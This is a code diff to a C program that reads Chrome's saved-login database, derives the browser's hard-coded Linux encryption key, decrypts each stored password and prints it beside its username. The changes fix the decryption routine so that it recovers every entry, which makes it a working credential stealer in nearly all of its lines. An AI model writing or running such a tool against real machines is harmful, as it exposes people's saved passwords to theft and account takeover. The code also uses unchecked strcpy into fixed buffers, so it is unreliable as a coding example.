@@ -4,7 +4,7 @@
 #include <unistd.h>
 #include <fcntl.h>
 #include <sqlite3.h>
-#include <openssl/evp.h> 
+#include <openssl/evp.h>
 #include <openssl/aes.h>
 
 #ifdef _WIN32
@@ -17,9 +17,10 @@
 struct DbUserEntry
 {
     char url[256];
-    char username[30];
+    char username[50];
     char password[128];
-    char hexpassword[256];
+    char encpassword[128];
+    char hexenc[256];
 };
 
 char *get_chrome_path()
@@ -98,45 +99,79 @@ int get_row_count(sqlite3 *db)
     return rowcount;
 }
 
-
 char *PBKDF2_HMAC_SHA_1_key()
 {
     unsigned int i;
     unsigned char *out;
     char pass[] = "peanuts";
-    //saltysalt
+    // saltysalt
     unsigned char salt[] = {'s', 'a', 'l', 't', 'y', 's', 'a', 'l', 't'};
     int32_t iterations = 1;
 
-    out = (unsigned char *) malloc(sizeof(unsigned char) * KEY_LEN);
+    out = (unsigned char *)malloc(sizeof(unsigned char) * KEY_LEN);
 
     PKCS5_PBKDF2_HMAC_SHA1(pass, strlen(pass), salt, strlen(salt), iterations, KEY_LEN, out);
-    
-    //printf("out: "); for(i=0;i<KEY_LEN;i++) { printf("%02x", out[i]); } printf("\n");
+
+    /*
+    printf("out: ");
+    for (i = 0; i < KEY_LEN; i++)
+    {
+        printf("%02x", out[i]);
+    }
+    printf("\n");
+    */
 
     return out;
 }
 
-int decrypt_login_data(struct DbUserEntry *login_data) 
+void clean(unsigned char *data, int length)
+{
+    int end = 0;
+    while (end < length)
+    {
+        if (data[end] >= '\x0a' && data[end] < '\x20')
+        {
+            break;
+        }
+        end++;
+    }
+
+    memset((void *)data + end, 0x00, length - end);
+    return;
+}
+
+int decrypt_login_data(struct DbUserEntry *login_data)
 {
     unsigned char *key = PBKDF2_HMAC_SHA_1_key();
 
     unsigned char iv[AES_BLOCK_SIZE];
     memset(iv, 0x20, AES_BLOCK_SIZE);
 
-    unsigned char dec[sizeof(login_data[0].password)];
+    unsigned char *dec = (unsigned char *)malloc(0x20);
     AES_KEY dec_key;
-
-    if (AES_set_decrypt_key(key, 256, &dec_key) < 0) {
-        printf("Failed to set decryption key!");
-        exit(1);
+    if (dec == NULL)
+    {
+        printf("Failed to malloc decryption buffer");
+        return 0;
     }
 
-    AES_cbc_encrypt(login_data[0].password+3, dec, 20, &dec_key, iv, AES_DECRYPT);
+    if (AES_set_decrypt_key(key, 128, &dec_key) < 0)
+    {
+        printf("Failed to set decryption key!");
+        return 0;
+    }
 
-    printf("Decrypted: %s\n", dec);
+    AES_cbc_encrypt(login_data->encpassword + 3, dec, 16, &dec_key, iv, AES_DECRYPT);
 
+    clean(dec, 0x20);
+    // printf("Decrypted: %s (%d bytes)\n", dec, strlen(dec));
+
+    memcpy(login_data->password, dec, strlen(dec));
+
+    free(dec);
     free(key);
+
+    return 1;
 }
 
 int main(int argc, char **argv)
@@ -182,8 +217,6 @@ int main(int argc, char **argv)
         return 1;
     }
 
-    printf("Password data:\n");
-
     struct DbUserEntry *login_data = malloc(sizeof(struct DbUserEntry) * get_row_count(db));
 
     int login_data_iterator = 0;
@@ -193,29 +226,24 @@ int main(int argc, char **argv)
 
         strcpy(login_data_entry.url, sqlite3_column_text(res, 0));
         strcpy(login_data_entry.username, sqlite3_column_text(res, 1));
-        memcpy(login_data_entry.password, (unsigned char *) sqlite3_column_blob(res, 2), sqlite3_column_bytes(res, 2));
-        strcpy(login_data_entry.hexpassword, sqlite3_column_text(res, 3));
+        memcpy(login_data_entry.encpassword, (unsigned char *)sqlite3_column_blob(res, 2), sqlite3_column_bytes(res, 2));
+        strcpy(login_data_entry.hexenc, sqlite3_column_text(res, 3));
+        memset(login_data_entry.password, 0x00, 128);
 
         login_data[login_data_iterator] = login_data_entry;
         login_data_iterator++;
     }
 
+    printf("Extracted Password(s):\n");
     for (int i = 0; i < login_data_iterator; i++)
     {
-        char buf[255] = {0};
-        printf("Password for user %s: %s (%s)\n", login_data[i].username, login_data[i].password, login_data[i].hexpassword);
-
-        /*
-        printf("Password for user %s: ", login_data[i].username);
-        for (size_t j = 0; j < strlen(login_data[i].password); j++)
+        if (!decrypt_login_data(&login_data[i]))
         {
-            sprintf(buf, "%s%02x", buf, login_data[i].password[j]);
+            printf("Failed to decrypt login data");
         }
-        printf("%s\n", buf);
-        */
+        char buf[255] = {0};
+        printf("Password for user '%s': %s\n", login_data[i].username, login_data[i].password);
     }
-
-    int ret = decrypt_login_data(login_data);
 
     free(login_data_path);
     free(login_data);
